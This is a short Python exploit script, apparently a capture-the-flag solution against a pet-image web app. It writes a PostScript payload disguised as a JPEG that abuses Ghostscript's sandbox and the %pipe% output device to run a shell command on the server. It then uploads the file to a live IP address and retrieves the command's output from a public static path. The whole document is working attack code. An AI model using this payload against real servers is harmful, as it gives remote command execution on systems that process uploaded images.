import os
import random
import string
import requests
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
from PIL import ImageFilter


# url = "http://localhost:1337"
url = "http://178.128.35.132:30345"

def create_jpg_poison_file():
    script = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops"""
    filename = "poison.jpg"
    with open(filename, 'w') as f:
        f.write(script)
        f.close()

def upload_poison_file():
    # upload the image file
    files = {'file': open('poison.jpg', 'rb')}
    r = requests.post(url + '/api/upload', files=files)
    print(r.text)

def extract_flag():
    r = requests.get(url + '/static/petpets/flag.txt')
    print(r.text)

create_jpg_poison_file()
upload_poison_file()
extract_flag()